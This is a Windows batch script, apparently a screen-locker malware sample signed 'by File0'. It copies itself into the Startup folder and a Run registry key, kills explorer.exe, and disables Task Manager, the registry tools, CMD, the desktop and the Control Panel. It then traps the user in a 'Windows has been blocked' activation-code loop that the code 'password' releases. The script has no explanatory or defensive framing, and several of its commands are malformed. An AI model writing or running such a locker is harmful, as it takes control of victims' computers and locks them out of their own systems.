@echo off

color a

msg by File0

copy blocker.bat "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

copy blocker.bat "C:\$SysReset"

taskkill /im explorer.exe /f > nul

copy %0 C:\Windows\Win32.bat > nul

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Win32 /t REG_SZ /d C:\Windows\Win32.bat /f

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f > nul

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCMD/t REG_DWORD/d 2 /f > nul

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f >nul

reg add HKCU\Software\Microsoft\Windows\Current Version\Policies\Explorer/v NoControlPanel /t REG_DWORD /d 1 /f >nul

cls

title Windows has been blocked

echo Windows has been blocked

:G

echo Enter the activation code:

set /p x=9999

if %x%==password (echo Windows starting!

start explorer

reg Delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f > nul

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f > nul

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 0 /f >nul

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCMD/t REG_DWORD/d 0 /f > nul

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 0 /f >nul

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer/v NoControlPanel /t REG_DWORD /d 0 /f >nul

exit

) ELSE (

cls

echo Activation code is incorrect!

echo Enter the acctivation code again!

)

goto G
